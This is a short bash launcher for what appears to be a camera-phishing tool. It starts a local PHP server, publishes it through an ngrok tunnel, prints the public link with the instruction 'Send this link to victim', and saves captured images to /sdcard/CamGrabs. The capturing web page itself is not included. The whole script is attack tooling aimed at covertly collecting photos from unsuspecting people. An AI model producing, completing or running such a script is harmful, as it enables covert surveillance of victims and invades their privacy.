#!/bin/bash

mkdir -p ~/camgrab
mkdir -p /sdcard/CamGrabs

cd ~/camgrab
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2

echo "[*] Starting ngrok..."
ngrok http 8080 > /dev/null 2>&1 &

sleep 5
link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io')

echo ""
echo "[*] Send this link to victim:"
echo "$link"
echo ""
echo "[*] Images will be saved to /sdcard/CamGrabs/"
